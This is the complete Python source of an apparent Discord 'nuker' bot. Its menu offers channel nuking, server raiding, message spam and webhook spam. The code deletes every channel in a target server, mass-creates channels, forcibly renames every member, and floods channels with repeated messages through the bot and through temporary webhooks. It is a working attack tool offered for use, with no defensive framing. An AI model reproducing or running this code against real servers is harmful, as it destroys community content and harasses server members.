import os
import discord
from colorama import Fore, Style, init
import json
import asyncio

# Initialize Colorama
init(autoreset=True)

intents = discord.Intents.default()
intents.typing = False
intents.presences = False

bot = discord.Client(intents=intents)

@bot.event
async def on_ready():
    print(f'{Fore.MAGENTA}{Style.BRIGHT}Logged in as {bot.user.name}{Style.RESET_ALL}')
    
    # Set the bot's status to "idle" with a custom status message
    await bot.change_presence(status=discord.Status.idle, activity=discord.Game("github.com/Jakee8718"))
    
    await main_menu()

    await main_menu()

async def main_menu():
    while True:
        clear_terminal()  # Clear the terminal
        print(f"{Fore.MAGENTA}{Style.BRIGHT}╔═══════════════════════════════════╦═════════╦═══════════════════════════════════╗")
        print(f"{Fore.MAGENTA}{Style.BRIGHT}╠═══════════════════════════════════╣{Fore.MAGENTA}{Style.BRIGHT} Options {Style.RESET_ALL}{Fore.MAGENTA}{Style.BRIGHT}╠═══════════════════════════════════╣")
        print(f"{Fore.MAGENTA}{Style.BRIGHT}║                                   ╚═════════╝                                   ║")
        print(f"{Fore.MAGENTA}{Style.BRIGHT}╠╡ (1) ╞═› {Fore.BLUE}{Style.BRIGHT} Nuke Channels {Style.RESET_ALL}   {Fore.MAGENTA}{Style.BRIGHT}     (3) ╞═› {Fore.BLUE}{Style.BRIGHT} Spam Channels  {Style.RESET_ALL}          {Fore.MAGENTA}{Style.BRIGHT}              ║")
        print(f"{Fore.MAGENTA}{Style.BRIGHT}╠╡ (2) ╞═› {Fore.BLUE}{Style.BRIGHT} Raid Server {Style.RESET_ALL}   {Fore.MAGENTA}{Style.BRIGHT}       (4) ╞═› {Fore.BLUE}{Style.BRIGHT} Spam With Webhook  {Style.RESET_ALL}          {Fore.MAGENTA}{Style.BRIGHT}          ║")
        print(f"{Fore.MAGENTA}{Style.BRIGHT}║                                                                                 ║")
        print(f"{Fore.MAGENTA}{Style.BRIGHT}{Fore.MAGENTA}{Style.BRIGHT}║ Last Updated: 8/3/2023                                                          ║")
        print(f"{Fore.MAGENTA}{Style.BRIGHT}║ Discord: https://discord.gg/qybBqmkcnE                                          ║")
        print(f"{Fore.MAGENTA}{Style.BRIGHT}╚═════════════════════════════════════════════════════════════════════════════════╝")
        # Changing the discord server and/or credits is not allowed and you will get in trouble
        
        option = input("Input:  ")

        if option == "1":
            guild_id = input("Enter the GUILD ID: ")
            await nuke(guild_id)
        elif option == "2":
            guild_id = input("Enter the GUILD ID: ")
            channel_name = input("Enter the Channel Name: ")
            num_channels = int(input("Enter the number of channels to create: "))
            nickname = input("Enter the Nickname for all members: ")
            await raid(guild_id, channel_name, num_channels, nickname)
        elif option == "3":
            guild_id = input("Enter the GUILD ID: ")
            channel_option = input("Enter the channel ID or 'all' to spam in all channels: ")
            
            if channel_option.lower() == "all":
                channel_ids = [ch.id for ch in bot.get_guild(int(guild_id)).channels]
            else:
                channel_ids = [int(channel_option)]
            
            message = input("Enter the message to spam: ")
            num_spams = int(input("Enter the number of times to spam the message in each channel: "))
            
            await spam_channels(channel_ids, message, num_spams)
        elif option == "4":
            await spam_with_webhook()
        else:
            print("Invalid option. Please choose a valid option.")

async def nuke(guild_id):
    guild = bot.get_guild(int(guild_id))
    
    if guild is None:
        print("Guild not found.")
        return
    
    for channel in guild.channels:
        if isinstance(channel, (discord.TextChannel, discord.VoiceChannel)):
            await delete_channel(channel)
            print(f'{Fore.GREEN}{Style.BRIGHT}Channel "{channel.name}" deleted successfully.{Style.RESET_ALL}')

async def raid(guild_id, channel_name, num_channels, nickname):
    guild = bot.get_guild(int(guild_id))
    
    if guild is None:
        print("Guild not found.")
        return
    
    for i in range(num_channels):
        try:
            new_channel = await guild.create_text_channel(channel_name)
            print(f'{Fore.GREEN}{Style.BRIGHT}Channel "{new_channel.name}" created successfully.{Style.RESET_ALL}')
        except Exception as e:
            print(f'{Fore.RED}{Style.BRIGHT}Failed to create channel: {e}{Style.RESET_ALL}')

    for member in guild.members:
        try:
            await member.edit(nick=nickname)
            print(f'{Fore.GREEN}{Style.BRIGHT}Nickname of "{member.name}" changed to "{nickname}" successfully.{Style.RESET_ALL}')
        except Exception as e:
            print(f'{Fore.RED}{Style.BRIGHT}Failed to change nickname for "{member.name}": {e}{Style.RESET_ALL}')

async def delete_channel(channel):
    try:
        await channel.delete()
        print(f'{Fore.GREEN}{Style.BRIGHT}Channel "{channel.name}" deleted successfully.{Style.RESET_ALL}')
    except Exception as e:
        print(f'{Fore.RED}{Style.BRIGHT}Failed to delete channel "{channel.name}": {e}{Style.RESET_ALL}')

async def spam_channels(channel_ids, message, num_spams):
    for channel_id in channel_ids:
        channel = bot.get_channel(channel_id)
        if channel is None:
            print(f"Channel with ID {channel_id} not found.")
            continue
        
        if isinstance(channel, discord.TextChannel):  # Check if it's a text channel
            for _ in range(num_spams):
                await channel.send(message)
                print(f'{Fore.GREEN}{Style.BRIGHT}Message "{message}" spammed in channel "{channel.name}".')
        else:
            print(f"Skipping {channel.name} because it's not a text channel.")

async def spam_with_webhook():
    guild_id = input("Enter the GUILD ID: ")
    channel_option = input("Enter the channel ID or 'all' to spam in all text channels: ")

    if channel_option.lower() == "all":
        text_channels = [ch for ch in bot.get_guild(int(guild_id)).channels if isinstance(ch, discord.TextChannel)]
    else:
        text_channels = [bot.get_channel(int(channel_option))]

    message = input("Enter the message to spam: ")
    num_spams = int(input("Enter the number of times to spam the message with each webhook: "))

    for channel in text_channels:
        webhook = await channel.create_webhook(name="Spam Webhook")
        print(f'{Fore.GREEN}{Style.BRIGHT}Webhook created in channel "{channel.name}" for spamming.{Style.RESET_ALL}')

        for _ in range(num_spams):
            await webhook.send(content=message)
            print(f'{Fore.GREEN}{Style.BRIGHT}Message "{message}" spammed with webhook in channel "{channel.name}".{Style.RESET_ALL}')
            await asyncio.sleep(0.2)  # Pause to avoid rate limits

        await webhook.delete()
        print(f'{Fore.GREEN}{Style.BRIGHT}Webhook deleted in channel "{channel.name}".{Style.RESET_ALL}')


def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')  # Clear the terminal based on OS

def start_bot():
    bot.run(load_bot_token())

def load_bot_token():
    with open("config.json", "r") as config_file:
        config = json.load(config_file)
    return config.get("bot_token")

if __name__ == "__main__":
    start_bot()
